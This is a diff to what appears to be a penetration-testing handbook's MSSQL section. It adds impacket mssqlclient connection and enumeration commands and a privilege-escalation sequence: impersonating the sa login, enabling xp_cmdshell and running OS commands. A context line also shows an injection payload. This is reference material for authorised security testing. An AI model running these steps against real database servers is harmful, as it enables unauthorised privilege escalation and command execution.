@@ -9,7 +9,6 @@
 - [MongoDB](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MongoDB)
 - [MDB Tools](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MDB-Tools)
 - [MSSQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MSSQL)
-- [mssqlclient.py](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#mssqlclient.py]
 - [MySQL](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#MySQL)
 - [mysqldump](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#mysqldump)
 - [NoSQL Injection](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/04_database_assessment.md#NoSQL-Injection)
@@ -46,15 +45,32 @@ uid=x' OR SUBSTRING(username,1,1)='m' and ''='&auth_primary=x&auth_secondary=962
 
 > https://github.com/fortra/impacket
 
+### Common Commands
+
+```c
+SQL> enum_logins
+SQL> enum_impersonate
+```
+
+### Connection
+
 ```c
 $ impacket-mssqlclient <USERNAME>@<RHOST>
 $ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
+$ sudo mssqlclient.py <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+```
 
+```c
 $ export KRB5CCNAME=<USERNAME>.ccache
 $ impacket-mssqlclient -k <RHOST>.<DOMAIN>
+```
 
-SQL> SELECT name FROM master.dbo.sysdatabases;
-SQL> use <DATABASE>;
+### Privilege Escalation
+
+```c
+SQL> exec_as_login sa
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
 ```
 
 ## MongoDB
